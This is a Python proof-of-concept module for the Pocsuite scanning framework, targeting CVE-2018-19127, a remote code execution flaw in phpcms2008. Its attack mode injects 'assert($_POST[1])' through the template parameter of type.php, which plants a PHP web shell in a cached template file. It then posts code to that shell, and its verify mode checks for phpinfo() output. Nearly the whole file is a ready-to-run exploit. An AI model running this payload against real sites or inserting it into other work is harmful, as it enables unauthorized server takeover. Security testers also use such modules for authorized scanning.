#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def post_url(url, data):
    try:
        httpreq = req.Session()
        headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        }
        resp = httpreq.post(url, data=data)
    except Exception as ex:
        resp = None
    return resp

class TestPOC(POCBase):
    name = 'phpcms2008 Remote Code Execution Vulnerability'
    vulID = 'CVE-2018-19127'
    author = ['cws6']
    vulType = 'code-exec'
    version = '1'
    references = ['https://www.cnblogs.com/ichunqiu/p/10039579.html']
    desc = '''phpcms2008 type.php存在任意代码执行'''

    vulDate = '2018-12-10'
    createDate = '2019-04-27'
    updateDate = '2019-04-27'

    appName = 'phpcms'
    appVersion = '2008'
    appPowerLink = 'http://www.phpcms.cn/'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        payload1 = '/type.php?template=tag_(){};assert($_POST[1]);{//../rss'
        data = {
        "1": "phpinfo();",
        }
        resp = req.get(self.url + payload1)
        resp1 = post_url(self.url + '/data/cache_template/rss.tpl.php',data)
        if "phpinfo" in resp1.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)

    def _verify(self):
        """verify mode"""
        result = {}
        payload1 = '/type.php?template=tag_(){};phpinfo();{//../rss'
        resp = req.get(self.url + payload1)
        resp1 = req.get(self.url + '/data/cache_template/rss.tpl.php')
        if "phpinfo" in resp1.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

